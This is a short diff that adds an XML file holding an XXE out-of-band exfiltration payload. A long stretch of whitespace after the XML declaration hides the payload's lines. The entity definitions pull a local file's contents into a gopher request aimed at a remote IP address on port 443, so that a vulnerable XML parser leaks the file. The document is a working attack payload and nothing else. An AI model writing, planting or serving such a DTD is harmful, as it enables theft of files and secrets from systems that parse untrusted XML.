@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8"?>                                                                                                                                                                                                                                         
+<!ENTITY % all "<!ENTITY send SYSTEM 'gopher://190.96.6.147:443/?x%file;'>">
+%all;
+
